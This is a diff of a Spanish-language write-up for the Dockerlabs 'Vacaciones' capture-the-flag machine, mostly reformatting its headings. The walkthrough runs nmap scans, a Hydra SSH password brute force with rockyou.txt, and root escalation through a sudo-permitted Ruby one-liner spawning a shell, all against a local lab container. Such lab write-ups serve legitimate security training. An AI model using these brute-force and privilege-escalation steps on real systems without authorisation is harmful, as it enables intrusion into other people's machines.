@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Vacaciones 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Vacaciones ​​
+
+## 🖥️ Writeup - Vacaciones
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `Hydra` `Lateral Movement` `Sudoers` `Ruby`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip vacaciones.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh vacaciones.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 20:47 CEST
 Nmap scan report for 172.17.0.2
@@ -78,6 +87,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 6.76 seconds
 ```
+
 Tenemos abiertos los puertos `22` y `80`.
 
 Accedemos por `HTTP` y nos encontramos con una página completamente en blanco.
@@ -90,13 +100,14 @@ Al inspeccionar el código fuente, descubrimos un comentario:
 
 Es posible que `juan` y `camilo` sean usuarios del sistema, así que realizamos un ataque de `fuerza bruta` contra el puerto `22` (`SSH`).
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 ```bash
 hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -116,7 +127,7 @@ Accedemos por `SSH`.
 ssh camilo@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 El comentario que hemos encontrado antes mencionaba algo sobre un `correo`, así que revisamos el directorio `/var/mail/`.
 
@@ -178,6 +189,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for juan on 6f03b78bdf0b:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -193,6 +205,7 @@ sudo ruby -e 'exec "/bin/sh"'
 ```
 
 Info:
+
 ```
 # whoami
 root
